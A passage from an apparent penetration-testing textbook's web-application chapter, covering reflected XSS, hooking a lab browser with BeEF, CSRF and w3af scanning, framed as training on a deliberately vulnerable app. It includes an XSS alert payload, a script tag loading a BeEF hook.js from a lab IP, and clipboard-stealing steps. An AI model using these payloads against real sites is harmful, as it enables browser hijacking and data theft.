id="ch14note03"/>Note</h3><p>A study of Powershell is outside of the scope of this book, but it is very helpful for post exploitation on the latest Windows operating systems. A good reference can be found here: <span class="emphasis"><em><a class="ulink" href="http://www.darkoperator.com/powershellbasics/" target="_top">http://www.darkoperator.com/powershellbasics/</a></em></span>.</p></div></div><div class="sect1" title="Cross-Site Scripting"><div class="titlepage"><div><div><h2 class="title" id="cross-site_scripting" style="clear: both">Cross-Site Scripting</h2></div></div></div><p>Perhaps the most common and most debated web application security vulnerability is cross-site scripting (XSS). When such vulnerabilities are present, attackers can inject malicious scripts into an otherwise innocuous site to be executed in the user’s browser.</p><p>XSS attacks are typically broken into two categories: stored and reflected. <span class="emphasis"><em>Stored XSS attacks</em></span> are stored on the server and executed whenever a user visits the page where the script is stored. User forums, reviews, and other places where users can save input displayed to other users are ideal places for these sorts of attacks. <span class="emphasis"><em>Reflective XSS attacks</em></span> are not stored on the server but are created by sending requests with the XSS attack itself. The attacks occur when user input is included in the server’s response, for example, in error messages or search results.</p><p>Reflected XSS attacks rely on a user sending a request with the XSS attack included, so there will likely be some sort of social-engineering component to the attack as well. In fact, having XSS might actually increase the success of a social-engineering attack, because you can craft a URL that is part of a real website—a website the user knows and trusts—and use the XSS to, for instance, redirect the user to a malicious page. Like the other attacks discussed in this chapter, XSS attacks rely on a lack of user input sanitation, which allows us to create and run a malicious script.</p><div class="sect2" title="Checking for a Reflected XSS Vulnerability"><div class="titlepage"><div><div><h3 class="title" id="checking_for_a_reflected_xss_vulnerabili">Checking for a Reflected XSS Vulnerability</h3></div></div></div><p><a class="indexterm" id="iddle1231"/><a class="indexterm" id="iddle2049"/><a class="indexterm" id="iddle2546"/>We should check any user input for XSS vulnerabilities. We’ll find that our application has a reflected XSS vulnerability in the search functionality. Try searching for the title <span class="emphasis"><em>xss</em></span> in the Books Search box, as shown in <a class="xref" href="ch14.xhtml#search_function" title="Figure 14-20. Search function">Figure 14-20</a>.</p><p>As shown in <a class="xref" href="ch14.xhtml#search_results_page" title="Figure 14-21. Search results page">Figure 14-21</a>, the search results page prints the original user input as part of the results. If the user input is not properly sanitized, this may be where we can use XSS.</p><div class="figure"><a id="search_function"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00137"/><img alt="Search function" src="httpatomoreillycomsourcenostarchimages2030464.png.jpg"/></div></div><div class="figure-title">Figure 14-20. Search function</div></div><div class="figure"><a id="search_results_page"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00138"/><img alt="Search results page" src="httpatomoreillycomsourcenostarchimages2030466.png"/></div></div><div class="figure-title">Figure 14-21. Search results page</div></div><p>The typical first XSS test to try to run is a JavaScript alert box. The following code will attempt to put up a JavaScript alert with the text <span class="emphasis"><em>xss</em></span>. If user input is not properly filtered, the script will be executed as part of the search results page.</p><a id="pro_id00188"/><pre class="programlisting">&lt;script&gt;alert('xss');&lt;/script&gt;</pre><p>In some cases, the user’s browser will automatically block obvious XSS attacks such as this one, and Iceweasel is one such browser. Switch over to your Windows 7 target with Internet Explorer. As shown in <a class="xref" href="ch14.xhtml#xss_pop-up" title="Figure 14-22. XSS pop-up">Figure 14-22</a>, the pop-up alert script executes.</p><div class="figure"><a id="xss_pop-up"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00139"/><img alt="XSS pop-up" src="httpatomoreillycomsourcenostarchimages2030468.png.jpg"/></div></div><div class="figure-title">Figure 14-22. XSS pop-up</div></div><p>Having determined that reflective XSS is present, we could try to leverage it to attack users. Common attacks include stealing session cookies to send to an attacker-controlled site or embedding a frame (a way of splitting an HTML page into different segments) to prompt the user for login credentials. A user may think that the frame is part of the original page and enter his or her credentials, which are then sent offsite to the attacker.</p></div><div class="sect2" title="Leveraging XSS with the Browser Exploitation Framework"><div class="titlepage"><div><div><h3 class="title" id="leveraging_xss_with_the_browser_exploita">Leveraging XSS with the Browser Exploitation Framework</h3></div></div></div><p><a class="indexterm" id="iddle1106"/><a class="indexterm" id="iddle1129"/><a class="indexterm" id="iddle1232"/><a class="indexterm" id="iddle2547"/>XSS issues tend to be overlooked. How much damage can an alert box that says “XSS” do anyway? A good tool for leveraging XSS issues and uncovering their true attack potential is the Browser Exploitation Framework (BeEF). Using BeEF, we can “hook” a browser by tricking the user into browsing to our BeEF server, or better yet using the BeEF JavaScript hook as a payload in the presence of an XSS vulnerability like the one discussed previously.</p><p>Now change directories to <span class="emphasis"><em>/usr/share/beef-xss</em></span>, and run <span class="strong"><strong><code class="literal">./beef</code></strong></span>, as shown in <a class="xref" href="ch14.xhtml#starting_beef" title="Example 14-3. Starting BeEF">Example 14-3</a>. This will start the BeEF server, including the web interface and the attack hook.</p><div class="example"><a id="starting_beef"/><div class="example-title">Example 14-3. Starting BeEF</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>cd /usr/share/beef-xss/</strong></span>&#13;
root@kali:/usr/share/beef-xss# <span class="strong"><strong>./beef</strong></span>&#13;
[11:53:26][*] Bind socket [imapeudora1] listening on [0.0.0.0:2000].&#13;
[11:53:26][*] Browser Exploitation Framework (BeEF) 0.4.4.5-alpha&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[11:53:27][+] running on network interface: 192.168.20.9&#13;
[11:53:27]    |   Hook URL: http://192.168.20.9:3000/hook.js&#13;
[11:53:27]    |_  UI URL:   http://192.168.20.9:3000/ui/panel&#13;
[11:53:27][*] RESTful API key: 1c3e8f2c8edd075d09156ee0080fa540a707facf&#13;
[11:53:27][*] HTTP Proxy: http://127.0.0.1:6789&#13;
[11:53:27][*] BeEF server started (press control+c to stop)</pre></div></div><p>Now in Kali, browse to <span class="emphasis"><em><a class="ulink" href="http://192.168.20.9:3000/ui/panel" target="_top">http://192.168.20.9:3000/ui/panel</a></em></span> to access the BeEF web interface. You should be presented with a login page, like the one shown in <a class="xref" href="ch14.xhtml#beef_login_page" title="Figure 14-23. BeEF login page">Figure 14-23</a>.</p><div class="figure"><a id="beef_login_page"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00140"/><img alt="BeEF login page" src="httpatomoreillycomsourcenostarchimages2030470.png.jpg"/></div></div><div class="figure-title">Figure 14-23. BeEF login page</div></div><p><a class="indexterm" id="iddle1477"/>The default credentials for BeEF are <span class="emphasis"><em>beef:beef</em></span>. After you enter them in the login dialog, you are shown the web interface (<a class="xref" href="ch14.xhtml#beef_web_interface" title="Figure 14-24. BeEF web interface">Figure 14-24</a>).</p><div class="figure"><a id="beef_web_interface"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00141"/><img alt="BeEF web interface" src="httpatomoreillycomsourcenostarchimages2030472.png.jpg"/></div></div><div class="figure-title">Figure 14-24. BeEF web interface</div></div><p>Currently no browsers are hooked in BeEF, so we need to trick someone into loading and running BeEF’s malicious <span class="emphasis"><em>hook.js</em></span> script. Let’s return to our XSS vulnerability in the Book Search box. This time, instead of using an alert dialog, let’s leverage the issue to load BeEF’s <span class="emphasis"><em>hook.js</em></span> in the target browser. From the Windows 7 Internet Explorer browser, enter <span class="strong"><strong><code class="literal">"&lt;script src=http://192.168.20.9:3000/hook.js&gt;&lt;/script&gt;"</code></strong></span> into the Book Search box, and click <span class="strong"><strong>Go</strong></span>. This time there will be no alert box or other indication to the user suggesting that anything is amiss, but if you turn back to BeEF, you should see the IP address of the Windows 7 box in the Online Browsers list at the left of the screen, as shown in <a class="xref" href="ch14.xhtml#hooked_browser" title="Figure 14-25. A hooked browser">Figure 14-25</a>.</p><p>In the details pane, with the IP address of Windows 7 selected in BeEF, you can see details about the hooked browser as well as the underlying system, such as versions and installed software. At the top of the pane are additional tabs, such as Logs and Commands. Click <span class="strong"><strong>Commands</strong></span> to see additional BeEF modules you can run against the hooked browser.</p><div class="figure"><a id="hooked_browser"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00142"/><img alt="A hooked browser" src="httpatomoreillycomsourcenostarchimages2030474.png.jpg"/></div></div><div class="figure-title">Figure 14-25. A hooked browser</div></div><p>For example, as shown in <a class="xref" href="ch14.xhtml#running_a_beef_module" title="Figure 14-26. Running a BeEF module">Figure 14-26</a>, navigate to <span class="strong"><strong>Browser</strong></span> ▸ <span class="strong"><strong>Hooked Domain</strong></span> ▸ <span class="strong"><strong>Create Alert Dialog</strong></span>. At the right of the screen, you have the option to change the alert text. When you finish, click <span class="strong"><strong>Execute</strong></span> at the bottom right.</p><div class="figure"><a id="running_a_beef_module"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00143"/><img alt="Running a BeEF module" src="httpatomoreillycomsourcenostarchimages2030476.png.jpg"/></div></div><div class="figure-title">Figure 14-26. Running a BeEF module</div></div><p><a class="indexterm" id="iddle1185"/><a class="indexterm" id="iddle2463"/>Turn back to your Windows 7 browser. You should see the pop-up dialog, shown in <a class="xref" href="ch14.xhtml#causing_an_alert_in_the_hooked_browser" title="Figure 14-27. Causing an alert in the hooked browser">Figure 14-27</a>.</p><div class="figure"><a id="causing_an_alert_in_the_hooked_browser"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00144"/><img alt="Causing an alert in the hooked browser" src="httpatomoreillycomsourcenostarchimages2030478.png.jpg"/></div></div><div class="figure-title">Figure 14-27. Causing an alert in the hooked browser</div></div><p>Another interesting BeEF command allows you to steal data from the Windows clipboard. On the Windows 7 system, copy some text to the clipboard. Now in BeEF, navigate in the Commands Module Tree to <span class="strong"><strong>Host</strong></span> ▸ <span class="strong"><strong>Get Clipboard</strong></span>. The text on the clipboard is displayed in the Command Results Pane on the right, as shown in <a class="xref" href="ch14.xhtml#stealing_clipboard_information" title="Figure 14-28. Stealing clipboard information">Figure 14-28</a>.</p><div class="figure"><a id="stealing_clipboard_information"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00145"/><img alt="Stealing clipboard information" src="httpatomoreillycomsourcenostarchimages2030480.png.jpg"/></div></div><div class="figure-title">Figure 14-28. Stealing clipboard information</div></div><p>In this section we have looked at only two simple examples of leveraging a hooked browser with BeEF. There is plenty more we can do. For example, we can use the target browser as a pivot to start gathering information about the local network with ping sweeps or even port scans. You <a class="indexterm" id="iddle1229"/><a class="indexterm" id="iddle1234"/><a class="indexterm" id="iddle1866"/><a class="indexterm" id="iddle1872"/><a class="indexterm" id="iddle2105"/><a class="indexterm" id="iddle2417"/><a class="indexterm" id="iddle2427"/><a class="indexterm" id="iddle2431"/><a class="indexterm" id="iddle2435"/>can even integrate BeEF with Metasploit. On your pentests, you can use BeEF as part of social-engineering attacks. If you can find an XSS in your client’s web server, you can improve the results of your campaign by directing users not to a attacker-owned site but rather to the company website they trust.</p></div></div><div class="sect1" title="Cross-Site Request Forgery"><div class="titlepage"><div><div><h2 class="title" id="cross-site_request_forgery" style="clear: both">Cross-Site Request Forgery</h2></div></div></div><p>Cross-site scripting exploits the trust a user has in a website, whereas a similar vulnerability class called <span class="emphasis"><em>cross-site request forgery (CSRF)</em></span> exploits a website’s trust in the user’s browser. Consider this scenario: A user is logged in to a banking website and has an active session cookie. Naturally, the user is also browsing to other websites in other tabs. The user opens a malicious website that contains a frame or image tag that triggers a HTTP request to the banking website with the correct parameters to transfer funds to another account (presumably the attacker’s account). The banking website, of course, checks to see that the user is logged in. Finding that the user’s browser has a currently active session, the banking website executes the command in the request, and the attacker steals the user’s money. The user, of course, never initiated the transaction—he just had the misfortune of browsing to a malicious website.</p></div><div class="sect1" title="Web Application Scanning with w3af"><div class="titlepage"><div><div><h2 class="title" id="web_application_scanning_with_w3af" style="clear: both">Web Application Scanning with w3af</h2></div></div></div><p>It is difficult to automate testing with a tool, particularly for custom applications. Nothing compares to a skilled web application tester with a proxy. That said, several commercial web application scanners and some free and open source scanners can automate tasks such as crawling the website and searching for known security issues.</p><p>One open source web application scanner is the <span class="emphasis"><em>Web Application Attack and Audit Framework (w3af)</em></span>. w3af is made up of plugins that perform different web application–testing tasks, such as looking for URLs and parameters to test and testing interesting parameters for SQL injection vulnerabilities.</p><p>Now start w3af, as shown here.</p><a id="pro_id00189"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>w3af</strong></span></pre><p>The w3af GUI will be launched and should look similar to <a class="xref" href="ch14.xhtml#using_w3af" title="Figure 14-29. Using w3af">Figure 14-29</a>. On the left of the screen are the scan configuration profiles. By default you are in an empty profile, which allows you to fully customize which w3af plugins are run against your target. You can also use several preconfigured profiles. For example, the <span class="emphasis"><em>OWASP_Top10</em></span> profile will crawl the app with plugins from the discovery section as well as run plugins from the audit section that look for vulnerabilities from the Open Web Application Security Project (OWASP)’s top ten vulnerability categories. Enter the URL to be scanned, as shown in <a class="xref" href="ch14.xhtml#using_w3af" title="Figure 14-29. Using w3af">Figure 14-29</a>, and click <span class="strong"><strong>Start</strong></span> at the right of the window.</p><div class="figure"><a id="using_w3af"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00146"/><img alt="Using w3af" src="httpatomoreillycomsourcenostarchimages2030482.png.jpg"/></div></div><div class="figure-title">Figure 14-29. Using w3af</div></div><p>As the scan runs, details will be shown in the Logs tab, and issues discovered will be added to the Results tab (<a class="xref" href="ch14.xhtml#w3af_results" title="Figure 14-30. w3af results">Figure 14-30</a>).</p><div class="figure"><a id="w3af_results"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00147"/><img alt="w3af results" src="httpatomoreillycomsourcenostarchimages2030484.png.jpg"/></div></div><div class="figure-title">Figure 14-30. w3af results</div></div><p>w3af finds the SQL injection vulnerability that we exploited at the start of this chapter as well as some minor issues that are worth adding to your pentest report. You can try other w3af profiles or create your own, customizing which plugins are run against the app. w3af can even do a credentialed scan, in which it has an active logged-in session with the app, giving it access to additional functionality to search for issues.</p></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00040" style="clear: both">Summary</h2></div></div></div><p>In this chapter we took a brief look at examples of common web application vulnerabilities in a sample application built without the input sanitation needed to mitigate many attacks. Our bookservice app has a SQL injection vulnerability in its books details page. We were able to extract data from the database and even get a system command shell.</p><p>We found a similar injection vulnerability in the XML-based login functionality. We were able to use a crafted query to bypass authentication and log in as the first user stored in the <span class="emphasis"><em>AuthInfo.xml</em></span> file. We were also able to use the newsletter page to see the source of arbitrary pages in the web application including the authentication information—the result of a lack of access control on the pages as well as a local file inclusion issue. We were able to run commands on the system by chaining them with the email address to sign up for newsletters, and we were able to write the output of commands to a file and then access them through the browser. We found an example of reflective XSS in the search functionality. We used BeEF to leverage this XSS issue and gain control of a target browser, giving us a foothold in the system. Finally, we looked briefly at an open source web vulnerability scanner, w3af.</p><p>Web application testing deserves much more discussion than we can devote to it in this book. All the issues covered in this chapter are discussed in detail on OWASP’s website <span class="emphasis"><em><a class="ulink" href="https://www.owasp.org/index.php/Main_Page/" target="_top">https://www.owasp.org/index.php/Main_Page/</a></em></span>, which is a good starting point for continuing your study of web application security. OWASP also publishes a vulnerable app, Webgoat, which uses exercises to give users hands-on experience exploiting web application issues like the ones in this chapter, as well as others. Working through Webgoat is a great next step if you want to learn more about testing web apps.</p><p>Another thing to note is that our application is an ASP.net application running on Windows. In your pentesting career, you will encounter other kinds of applications, such as Apache/PHP/MySQL applications running on Linux, or a Java web application. You may also find yourself testing applications that use APIs such as REST and SOAP to transfer data. Though the underlying issues caused by lack of input sanitation can occur on any platform, the particular coding mistakes and the syntax to exploit them may vary. Be sure to become familiar with different kinds of applications as you continue to study web application security.</p></div></section></body></html>